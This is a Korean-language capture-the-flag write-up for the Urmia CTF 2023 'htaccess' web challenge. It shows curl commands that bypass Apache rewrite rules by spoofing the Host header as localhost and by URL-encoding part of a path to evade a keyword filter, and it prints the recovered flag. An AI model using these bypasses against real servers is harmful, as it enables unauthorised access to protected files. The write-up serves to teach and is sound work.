---
title: "[Urmia CTF 2023] htaccess(helicoptering) writeup"
date: 2023-09-03 11:01:00 +0900
categories: [WEB]
tags: [ctf, web, apache]
description: web ctf challenge about apache htaccess
---

## solve
![](/assets/img/posts/230903-01.png)

두개의 `.htaccess` 를 우회하면 flag를 획득할 수 있다.

```
$ curl http://htaccess.uctf.ir/one/flag.txt
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>
```
만약 우회하지 않고 접근한다면 403을 반환한다.
```
RewriteEngine On
RewriteCond %{HTTP_HOST} !^localhost$
RewriteRule ".*" "-" [F]
```
첫 번째 `.htaccess` 는 HTTP_HOST가 localhost인지 확인한다.

```
$ curl -H 'Host: localhost' http://htaccess.uctf.ir/one/flag.txt
uctf{Sule_%
```
요청할 때 헤더에 Host를 바꿔주면 통과된다.

```
RewriteEngine On
RewriteCond %{THE_REQUEST} flag
RewriteRule ".*" "-" [F]
```
두 번째 `.htaccess` 는 THE_REQUEST 변수에 flag가 존재하는지 검사한다.

```
THE_REQUEST
    The full HTTP request line sent by the browser to the server (e.g., "GET /index.html HTTP/1.1"). This does not include any additional headers sent by the browser. This value has not been unescaped (decoded), unlike most other variables below.
```
[documentation](https://httpd.apache.org/docs/current/mod/mod_rewrite.html)에 의하면 request path 부분(GET /path HTTP/1.1)이 THE_REQUEST 변수에 해당하는 것으로 보인다. 또한, decoded text라고 하니, flag 부분을 url encode 해주면 될 것 같다.

```
$ curl http://htaccess.uctf.ir/two/%66lag.txt
Dukol_waterfall}%
```

f 부분만 %66으로 바꿔서 요청해주면 나머지 플래그를 획득할 수 있다.

`uctf{Sule_Dukol_waterfall}`

## ref.
[apache documentation](https://httpd.apache.org/docs/current/mod/mod_rewrite.html)